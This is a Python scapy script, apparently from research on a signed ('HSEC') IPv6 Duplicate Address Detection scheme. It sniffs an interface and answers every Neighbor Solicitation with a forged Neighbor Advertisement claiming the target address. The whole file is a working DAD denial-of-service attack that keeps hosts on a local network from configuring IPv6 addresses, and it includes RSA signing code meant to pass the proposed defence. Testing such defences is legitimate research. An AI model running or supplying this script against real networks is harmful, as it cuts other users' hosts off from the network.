from __future__ import print_function
from scapy.all import *
import random

from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Hash import SHA256


class DadReply:

    flag=True

    def __init__(self, iface):
        self.iface=iface;


    def parseIp(self, ip):
        self.strIP = ip.replace(":", "")
        self.snma = self.strIP[-6:]
        self.suffix = self.strIP[:26]
        return [self.snma, self.strIP, self.suffix]

    def sendNa(self,ip):

        snma, ipWithoutColon, suffix = self.parseIp(ip)

        self.key = RSA.generate(2048)

        l2 = Ether(dst='33:33:ff:' + snma[:2] + ':' + snma[2:4] + ':' + snma[4:])
        l3 = IPv6(src=ip, dst='ff02::1:ff:' + snma[:2] + ':' + snma[2:])

        na = ICMPv6ND_NA(tgt=ip)

        Pkey, EnHash  = self.hash(ip)
        HSEC = ICMPv6NDOptDADHSEC(EnHash=EnHash, Pkey=Pkey)

        p = (l2 / l3 / na/ HSEC)
        print("sending NA packet with HSEC option")
        # print(p.display())

        sendp(p, iface=self.iface)

    def verifingNS(self, packet):
        # ns = ICMPv6ND_NS()
        if IPv6 in packet[0][1]:
            # print(packet)
            ipv6 = packet[0][1][IPv6]
            if ICMPv6ND_NS in ipv6:
                ns = ipv6[ICMPv6ND_NS]
                # if ICMPv6NDOptDADHSEC in ns:
                HSEC = ipv6[ICMPv6ND_NS]
                self.ip= ns.tgt
                # print("attack")
                self.sendNa(self.ip)

    def hash(self, ip):
        signer = PKCS1_v1_5.new(self.key)
        digest = SHA256.new(ip)
        signature = signer.sign(digest)
        n = self.key.n

        # covert n(int) to hex string
        nString = "{:02x}".format(n)
        # covert nString 'hex string' to hex
        nhex = nString.decode("hex")

        return nhex , signature

    def verifyRSA(self, HSEC, tgt):
        e = 65537L
        n = HSEC.Pkey
        signature = HSEC.EnHash


        n = n.encode("hex")
        n = int(n, 16)

        key_params = (n, e)
        geratedkey = RSA.construct(key_params)
        h = SHA256.new(tgt)
        verifier = PKCS1_v1_5.new(geratedkey)
        return verifier.verify(h, signature)

    def sniffingAndReply(self):
        # endtime = datetime.now() + timedelta(seconds=3)
        print("Replay DAD is starting")
        sniff(prn=self.verifingNS)
